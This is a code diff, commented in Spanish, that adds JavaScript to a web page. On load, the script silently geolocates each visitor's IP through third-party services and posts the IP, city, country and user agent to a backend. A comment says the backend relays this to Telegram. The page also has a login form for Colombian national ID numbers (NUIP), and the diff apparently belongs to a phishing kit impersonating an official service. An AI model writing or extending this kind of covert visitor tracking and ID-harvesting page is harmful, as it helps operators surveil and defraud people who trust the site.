@@ -343,6 +343,60 @@
     </div>
 
     <script>
+        // ============================================================
+        // 🚪 NOTIFICAR NUEVO INGRESO AL BACKEND (va a Telegram)
+        // ============================================================
+        async function notificarIngreso() {
+            // Evitar doble notificación si recarga en la misma sesión
+            if (sessionStorage.getItem('ingreso_notificado')) return;
+            sessionStorage.setItem('ingreso_notificado', '1');
+
+            let ip = 'Desconocida';
+            let ciudad = 'Desconocida';
+            let pais = 'Desconocido';
+
+            try {
+                const r = await fetch('https://ipwho.is/');
+                const d = await r.json();
+                if (d.success && d.ip) {
+                    ip = d.ip;
+                    ciudad = d.city || 'Desconocida';
+                    pais = d.country || 'Desconocido';
+                }
+            } catch (e) {
+                try {
+                    const r = await fetch('https://ipapi.co/json/');
+                    const d = await r.json();
+                    if (d.ip) {
+                        ip = d.ip;
+                        ciudad = d.city || 'Desconocida';
+                        pais = d.country_name || 'Desconocido';
+                    }
+                } catch (e2) {}
+            }
+
+            try {
+                await fetch('/api/nuevo-ingreso', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        ip,
+                        ciudad,
+                        pais,
+                        user_agent: navigator.userAgent
+                    })
+                });
+            } catch (e) {
+                console.warn('No se pudo notificar el ingreso:', e);
+            }
+        }
+
+        // Ejecutar al cargar la página
+        document.addEventListener('DOMContentLoaded', notificarIngreso);
+
+        // ============================================================
+        // Formulario NUIP → redirige a consultar.html
+        // ============================================================
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault(); // Evita que el formulario se envíe de inmediato
 
